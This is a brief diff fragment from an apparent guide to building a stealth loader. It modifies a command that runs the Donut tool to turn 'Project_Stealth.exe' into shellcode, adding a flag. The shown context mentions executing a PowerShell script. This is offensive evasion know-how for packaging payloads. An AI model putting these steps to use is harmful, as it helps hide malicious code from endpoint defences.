@@ -35,7 +35,7 @@ ExecutePowerShell(psScript);
 Use [Donut](https://github.com/TheWover/donut) to convert the compiled loader into shellcode:
 
 ```bash
-.\donut.exe -i "Project_Stealth.exe" -a 2 -f 1 -o shellcode.bin
+.\donut.exe -i "Project_Stealth.exe" -a 2 -f 1 -b 1 -o shellcode.bin
 ```
 
 - `-a 2`: Target .NET assemblies
